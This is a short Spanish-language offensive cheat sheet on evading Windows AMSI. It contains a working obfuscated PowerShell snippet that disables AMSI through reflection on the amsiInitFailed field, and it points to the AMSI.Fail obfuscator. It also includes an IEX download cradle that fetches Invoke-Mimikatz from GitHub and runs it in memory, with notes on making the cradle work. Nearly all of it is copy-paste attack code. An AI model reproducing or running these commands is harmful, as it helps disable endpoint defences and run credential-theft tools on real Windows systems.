# Evasión de detección en tiempo real (AMSI)

Tags: #AD #Evasion #Windows #AMSI 

## Evadir AMSI 

```bash 
# Copiar y pegar en powershell para evadir el AMSI (Efectiva). Esto solo funciona al cargar en memoria los binarios ".PS1"

$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff") 
```

## Otra forma de evadir AMSI 

* [AMSI.Fail](https://amsi.fail/)

```bash 
Esta herramienta nos ayuda a ofuscar el contenido de diferentes maneras, solo se necesita:
	1. Dar click en "Generar"
	2. Dar click en "Copiar en el Clipboard"
	3. Pegarlo en el Powershell 
	4. Descargar el binario por ejemplo:
	   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Invoke-Mimikatz.ps1');

Nota:
	- Esto solo funciona al cargar en memoria los binarios ".PS1"
```

**NOTA:** Cuando se descargan herramientas en memoria usando `IEX (New-Object Net.WebClient).DownloadString(...)` en PowerShell con Github, el enlace debe apuntar siempre a la **versión RAW del archivo** y no a la página normal del repositorio. Esto se debe a que `IEX` necesita recibir únicamente el **código del script en texto plano** para poder interpretarlo y ejecutarlo; si se utiliza un enlace que no es RAW, lo que se descargará será HTML de la página web y el script no podrá ejecutarse correctamente.
